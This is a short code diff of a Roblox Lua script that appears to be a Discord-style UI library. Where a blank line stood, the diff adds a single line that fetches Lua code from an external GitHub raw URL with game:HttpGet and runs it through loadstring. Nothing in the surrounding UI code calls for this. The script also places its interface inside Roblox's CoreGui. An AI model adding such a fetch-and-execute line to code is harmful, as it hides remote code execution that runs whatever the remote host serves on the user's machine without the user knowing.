@@ -85,7 +85,7 @@ local function MakeDraggable(topbarobject, object)
 		end
 	)
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ginchao/Hoclomcongthuc/main/vohai"))()
 local Discord = Instance.new("ScreenGui")
 Discord.Name = "Discord"
 Discord.Parent = game:GetService("CoreGui").RobloxGui.Modules.Server.ServerPlayer
